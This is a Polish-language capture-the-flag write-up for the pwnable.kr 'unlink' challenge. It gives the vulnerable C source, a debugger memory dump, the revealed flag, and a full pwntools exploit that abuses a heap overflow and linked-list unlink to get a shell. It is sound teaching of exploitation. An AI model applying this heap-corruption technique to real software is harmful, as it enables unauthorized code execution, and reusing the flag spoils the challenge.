## unlink - 10 pt ##

Flaga: `conditional_write_what_where_from_unl1nk_explo1t`

Kod źródłowy **unlink.c**:


```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}

```
* Output z checksec:
```
[*] '/home/unlink/unlink'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```
* Program na początku działania alokuje trzy struktrury na stercie i tworzy z nich listę dwukierunkową (double linked list)
* Za pomocą `gets()` można nadpisać nagłówek struktury `B`
* Funkcja `unlink()` zajmuje się "sprzątaniem" - jej działanie jest identyczne jak podczas zwalniania pamięci za pomocą `free()` tzn:
  * Pobierany jest następny element listy, wzgledem "zwalnianej" struktury - do zmiennej `FD`
  * Wskaźnik na poprzedni element, zapisywany jest w zmiennej `BK`
* Koniec funkcji `main()` zawiera kod mogący spowodować sytuację write-what-where - w przypadku tego zadania chodzi konkretnie o przepisanie adresu z heapa na stos:
```asm
0x80485ff <main+208> mov ecx, dword ptr [ebp - 4] <0xf77635a0> 
0x8048602 <main+211> leave 
0x8048603 <main+212> lea esp, dword ptr [ecx - 4] 
0x8048606 <main+215> ret
```
* Patrząc na powyższy listing, najbardziej interesujące z naszego punktu widzenia jest nadpisanie pamięci pod adresem `ebp-4` - wartość ta jest w późniejszym etapie ładowana na początek stosu
* Wartość `ebp-4` "leży" w odległości 16 bajtów od intencjonalnego leaku adresu stosu w binarce - w tą wartość wpiszemy adres heapa, na którym umieścimy adres funkcji `shell()`
* Docelowa struktura pamięci będzie wyglądać w następujący sposób: `| adres shell() | JUNK 8 bajtów + 4 bajty | leaked heap + 12 | leaked stack + 16 |`
  * `leaked heap + 12` - wartość do wpisania 
  * `leaked stack + 16` - adres do wpisania (`ebp-4`)
  * Poniżej zawartość pamięci, aby lepiej móc zobrazować co dzieje się "pod spodem":
```
gdb-peda$ r
Starting program: /home/unlink/unlink 
here is stack address leak: 0xffcbbc24
here is heap address leak: 0x8789410
now that you have leaks, get shell!
[...]
gdb-peda$ x/ 0x8789410
0x8789410:	0x08789428
gdb-peda$ x/10 0x8789410
0x8789410:	0x08789428	0x00000000	0x00000000	0x00000000
0x8789420:	0x00000000	0x00000019	0x08789440	0x08789410
0x8789430:	0x00000000	0x00000000
gdb-peda$ x/10 0x08789428
0x8789428:	0x08789440	0x08789410	0x00000000	0x00000000
0x8789438:	0x00000000	0x00000019	0x00000000	0x08789428
0x8789448:	0x00000000	0x00000000
gdb-peda$ x/10 0x08789440
0x8789440:	0x00000000	0x08789428	0x00000000	0x00000000
0x8789450:	0x00000000	0x00000409	0x20776f6e	0x74616874
0x8789460:	0x756f7920	0x76616820
gdb-peda$ x/10 0xffcbbc24
0xffcbbc24:	0x08789410	0x08789440	0x08789428	0xf76ce3dc
0xffcbbc34:	0xffcbbc50	0x00000000	0xf7537637	0xf76ce000
0xffcbbc44:	0xf76ce000	0x00000000
gdb-peda$ x/10 0x08789428
0x8789428:	0x08789440	0x08789410	0x00000000	0x00000000
0x8789438:	0x00000000	0x00000019	0x00000000	0x08789428
0x8789448:	0x00000000	0x00000000
```
* Po poskładaniu wszystkiego do kupy, gotowy exploit:
```python
from pwn import * 
SHELL = 0x80484eb

c = ssh(host='pwnable.kr', user='unlink', password='guest', port=2222) 
p = c.process('./unlink') 

p.recvuntil('here is stack address leak: ') 
s_addr = int(p.recvline().strip(), 16) 

p.recvuntil('here is heap address leak: ') 
a_addr = int(p.recvline().strip(), 16) 
p.recvline() 

payload = p32(SHELL) + 'A' * 12 + p32(a_addr + 12) + p32(s_addr + 0x10) 
p.sendline(payload) 
p.interactive()

```
* Uruchomienie exploita:
```
» python unlink.py 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/fumfel/.pwntools-cache/update to 'never'.
[*] You have the latest version of Pwntools (3.12.0)
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn't check security settings on 'pwnable.kr'
[+] Starting remote process './unlink' on pwnable.kr: pid 29725
[*] Switching to interactive mode
$ $ cat flag
conditional_write_what_where_from_unl1nk_explo1t
```
